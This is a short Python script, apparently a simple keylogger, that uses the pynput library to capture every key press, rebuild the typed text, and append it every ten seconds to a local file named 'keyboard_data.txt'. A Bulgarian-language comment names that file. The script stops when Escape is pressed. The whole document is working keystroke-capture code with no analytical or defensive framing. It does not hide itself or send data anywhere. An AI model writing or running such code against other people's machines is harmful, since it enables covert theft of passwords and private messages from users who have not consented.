from pynput import keyboard
import json
import threading

text = ""

file_path = "keyboard_data.txt"  # Файлът, в който ще записвате клавишите

time_interval = 10


def save_to_file(data):
    with open(file_path, 'a') as file:
        file.write(data)


def save_to_file_and_clear():
    global text
    save_to_file(text)
    text = ""
    timer = threading.Timer(time_interval, save_to_file_and_clear)
    timer.start()


def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


with keyboard.Listener(on_press=on_press) as listener:
    save_to_file_and_clear()
    listener.join()
